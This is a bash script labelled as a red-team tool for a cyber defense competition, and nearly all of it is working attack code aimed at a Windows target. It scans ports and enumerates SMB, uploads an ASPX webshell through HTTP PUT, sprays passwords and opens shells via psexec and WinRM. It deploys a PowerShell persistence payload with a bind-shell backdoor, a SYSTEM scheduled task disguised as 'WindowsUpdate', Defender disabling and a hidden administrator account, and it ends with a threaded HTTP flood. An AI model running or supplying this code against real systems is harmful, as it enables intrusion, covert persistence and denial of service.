#!/bin/bash

# Red Team Attack Script for Cyber Defense Competition
# Usage: ./red_team_attack.sh <target_ip> [username] [password]

# Check if target IP is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip> [username] [password]"
    exit 1
fi

TARGET_IP="$1"
USERNAME="${2:-Administrator}"
PASSWORD="${3:-P@ssw0rd}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${RED}"
echo "======================================================"
echo "       RED TEAM ATTACK SCRIPT - CYBER DEFENSE         "
echo "======================================================"
echo -e "${NC}"

# Install required packages
install_dependencies() {
    echo -e "${BLUE}[*] Installing dependencies...${NC}"
    sudo apt update
    sudo apt install -y nmap python3 python3-pip smbclient enum4linux hydra metasploit-framework impacket-scripts
    sudo pip3 install impacket pywinrm requests
    echo -e "${GREEN}[+] Dependencies installed${NC}"
}

# Reconnaissance phase
recon() {
    echo -e "${BLUE}[*] Starting reconnaissance on $TARGET_IP...${NC}"
    
    # Create output directory
    mkdir -p recon_output
    
    # Quick port scan
    echo -e "${YELLOW}[*] Running quick port scan...${NC}"
    nmap -T4 -F $TARGET_IP -oN recon_output/quick_scan.txt
    
    # Checking for common Windows services
    echo -e "${YELLOW}[*] Checking for Windows services...${NC}"
    nmap -p 88,389,445,636,3268,3269,5985,5986,80,443 -sV $TARGET_IP -oN recon_output/windows_services.txt
    
    # SMB enumeration if port 445 is open
    if nmap -p 445 --open -T4 $TARGET_IP | grep -q "open"; then
        echo -e "${YELLOW}[*] Enumerating SMB shares...${NC}"
        enum4linux -a $TARGET_IP > recon_output/smb_enum.txt
    fi
    
    echo -e "${GREEN}[+] Reconnaissance completed${NC}"
}

# Try to exploit IIS
attack_iis() {
    echo -e "${BLUE}[*] Attempting to exploit IIS on $TARGET_IP...${NC}"
    
    # Check if port 80 or 443 is open
    if nmap -p 80,443 --open -T4 $TARGET_IP | grep -q "open"; then
        echo -e "${YELLOW}[*] IIS service detected, attempting to exploit...${NC}"
        
        # Create a simple webshell
        cat > shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.QueryString["cmd"] != null)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            
            StreamReader reader = process.StandardOutput;
            string result = reader.ReadToEnd();
            process.WaitForExit();
            Response.Write("<pre>" + result + "</pre>");
        }
    }
</script>
<html>
<body>
    <form runat="server">
        <div>
            IIS Webshell
        </div>
    </form>
</body>
</html>
EOF
        
        # Try to upload the webshell using various methods
        echo -e "${YELLOW}[*] Attempting to upload webshell...${NC}"
        
        # Try using PUT method if WebDAV is enabled
        curl -X PUT --data-binary @shell.aspx "http://$TARGET_IP/shell.aspx"
        
        echo -e "${YELLOW}[*] Webshell may have been uploaded. Check: http://$TARGET_IP/shell.aspx?cmd=whoami${NC}"
        echo -e "${YELLOW}[*] If successful, you can run commands via: http://$TARGET_IP/shell.aspx?cmd=<command>${NC}"
    else
        echo -e "${RED}[-] IIS service not detected on standard ports${NC}"
    fi
}

# Try to exploit Active Directory with credentials
attack_ad() {
    echo -e "${BLUE}[*] Attempting to exploit Active Directory on $TARGET_IP...${NC}"

    # Check if Kerberos port is open
    if nmap -p 88 --open -T4 $TARGET_IP | grep -q "open"; then
        echo -e "${YELLOW}[*] Active Directory services detected${NC}"
        
        # Try to get a list of users with kerbrute
        echo -e "${YELLOW}[*] Attempting credential spray...${NC}"
        
        # Create a simple passwordlist
        echo "$PASSWORD" > passwords.txt
        echo "Password123!" >> passwords.txt
        echo "Password1" >> passwords.txt
        echo "Passw0rd" >> passwords.txt
        
        # Try smb login with provided credentials
        echo -e "${YELLOW}[*] Attempting SMB login with provided credentials...${NC}"
        smbclient -L $TARGET_IP -U "$USERNAME%$PASSWORD" 
        
        # If we have credentials, use impacket to get shell
        echo -e "${YELLOW}[*] Attempting to get shell using impacket...${NC}"
        python3 -m impacket.examples.psexec "$USERNAME:$PASSWORD@$TARGET_IP"
        
        # Try WinRM if port 5985 is open
        if nmap -p 5985 --open -T4 $TARGET_IP | grep -q "open"; then
            echo -e "${YELLOW}[*] WinRM service detected, attempting to connect...${NC}"
            
            # Create a simple WinRM Python script
            cat > winrm_shell.py << 'EOF'
#!/usr/bin/env python3
import sys
import winrm

if len(sys.argv) != 4:
    print("Usage: %s <target> <username> <password>" % sys.argv[0])
    sys.exit(1)

target = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

try:
    session = winrm.Session(target, auth=(username, password))
    
    while True:
        cmd = input("WinRM > ")
        if cmd.lower() in ['exit', 'quit']:
            break
            
        result = session.run_cmd(cmd)
        print(result.std_out.decode('utf-8'))
        print(result.std_err.decode('utf-8'))
except Exception as e:
    print("Error:", str(e))
EOF
            
            chmod +x winrm_shell.py
            python3 winrm_shell.py $TARGET_IP $USERNAME $PASSWORD
        fi
    else
        echo -e "${RED}[-] Active Directory services not detected${NC}"
    fi
}

# Deploy persistence mechanisms
deploy_persistence() {
    echo -e "${BLUE}[*] Deploying persistence mechanisms...${NC}"
    
    # Create a simple backdoor service script
    cat > backdoor.ps1 << 'EOF'
$BackdoorCode = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Threading;

public class Backdoor {
    public static void RunBackdoor() {
        while(true) {
            try {
                TcpListener server = new TcpListener(IPAddress.Any, 8888);
                server.Start();
                
                Console.WriteLine("Backdoor listening on port 8888");
                
                TcpClient client = server.AcceptTcpClient();
                NetworkStream stream = client.GetStream();
                
                using (Process process = new Process()) {
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardInput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.CreateNoWindow = true;
                    
                    process.Start();
                    
                    Thread outputThread = new Thread(new ThreadStart(() => {
                        byte[] buffer = new byte[2048];
                        try {
                            while(true) {
                                int bytesRead = process.StandardOutput.BaseStream.Read(buffer, 0, buffer.Length);
                                if (bytesRead > 0)
                                    stream.Write(buffer, 0, bytesRead);
                            }
                        } catch {}
                    }));
                    
                    Thread errorThread = new Thread(new ThreadStart(() => {
                        byte[] buffer = new byte[2048];
                        try {
                            while(true) {
                                int bytesRead = process.StandardError.BaseStream.Read(buffer, 0, buffer.Length);
                                if (bytesRead > 0)
                                    stream.Write(buffer, 0, bytesRead);
                            }
                        } catch {}
                    }));
                    
                    outputThread.Start();
                    errorThread.Start();
                    
                    byte[] commandBuffer = new byte[2048];
                    
                    while(true) {
                        int bytesRead = stream.Read(commandBuffer, 0, commandBuffer.Length);
                        if (bytesRead == 0) break;
                        
                        string command = Encoding.ASCII.GetString(commandBuffer, 0, bytesRead);
                        process.StandardInput.WriteLine(command);
                    }
                    
                    process.Kill();
                }
                
                client.Close();
                server.Stop();
            } catch {
                Thread.Sleep(10000);  // Wait 10 seconds before retrying
            }
        }
    }
}
'@

Add-Type -TypeDefinition $BackdoorCode

# Set up a scheduled task to run every 5 minutes
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command [Backdoor]::RunBackdoor()"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -MultipleInstances IgnoreNew

Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Windows Update Service"

# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# Create backdoor user
$Password = ConvertTo-SecureString "BackdoorPass123!" -AsPlainText -Force
New-LocalUser -Name "SupportTech" -Password $Password -Description "Technical Support Account" -AccountNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member "SupportTech"

# Hide the user from login screen
$RegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
If (!(Test-Path $RegistryPath)) {
    New-Item -Path $RegistryPath -Force | Out-Null
}
New-ItemProperty -Path $RegistryPath -Name "SupportTech" -Value 0 -PropertyType DWORD -Force

Write-Output "Persistence mechanisms deployed"
EOF

    # Try to deploy using WinRM if available
    if nmap -p 5985 --open -T4 $TARGET_IP | grep -q "open"; then
        echo -e "${YELLOW}[*] Deploying persistence via WinRM...${NC}"
        
        cat > deploy_persistence.py << EOF
#!/usr/bin/env python3
import winrm
import sys
import base64

# Encode the PowerShell script as base64
with open('backdoor.ps1', 'r') as file:
    script = file.read()
    
encoded_script = base64.b64encode(script.encode('utf-16-le')).decode('ascii')

# Set up WinRM connection
session = winrm.Session('$TARGET_IP', auth=('$USERNAME', '$PASSWORD'))

# Execute the script
result = session.run_ps("powershell -EncodedCommand " + encoded_script)
print(result.std_out.decode('utf-8'))
print(result.std_err.decode('utf-8'))
EOF
        
        chmod +x deploy_persistence.py
        python3 deploy_persistence.py
    fi
    
    echo -e "${GREEN}[+] Persistence mechanisms attempted${NC}"
}

# Run denial of service
run_dos() {
    echo -e "${BLUE}[*] Preparing denial of service attack...${NC}"
    
    # Create a simple DoS script for IIS
    cat > iis_dos.py << 'EOF'
#!/usr/bin/env python3
import requests
import threading
import sys
import time
import random
import string

target = sys.argv[1]
threads = 50
request_count = 0
start_time = time.time()

def random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def make_request():
    global request_count
    while True:
        try:
            # Create a request with random parameters to bypass caching
            random_param = random_string(10)
            random_value = random_string(1000)  # Large value
            url = f"http://{target}/?{random_param}={random_value}"
            
            # Add random headers to make requests unique
            headers = {
                'User-Agent': f'Mozilla/5.0 {random_string(20)}',
                'Accept': '*/*',
                'Cache-Control': 'no-cache',
                'X-Requested-With': random_string(15),
                'X-Request-ID': random_string(20),
                'Connection': 'keep-alive'
            }
            
            requests.get(url, headers=headers, timeout=1)
            request_count += 1
            
            # Print status every 100 requests
            if request_count % 100 == 0:
                elapsed = time.time() - start_time
                rate = request_count / elapsed
                print(f"Requests: {request_count}, Rate: {rate:.2f} req/sec")
                
        except:
            pass

print(f"Starting DoS attack against {target} with {threads} threads")

# Start threads
thread_list = []
for i in range(threads):
    t = threading.Thread(target=make_request)
    t.daemon = True
    thread_list.append(t)
    t.start()

# Keep main thread alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nAttack stopped by user")
    elapsed = time.time() - start_time
    rate = request_count / elapsed
    print(f"Total requests: {request_count}, Average rate: {rate:.2f} req/sec")
EOF
    
    chmod +x iis_dos.py
    
    echo -e "${YELLOW}[*] Starting DoS attack against IIS (press Ctrl+C to stop)...${NC}"
    python3 iis_dos.py $TARGET_IP
}

# Main execution flow
echo -e "${BLUE}[*] Starting attack sequence against $TARGET_IP...${NC}"
install_dependencies
recon
attack_iis
attack_ad
deploy_persistence
run_dos

echo -e "${GREEN}[+] Attack sequence completed${NC}"
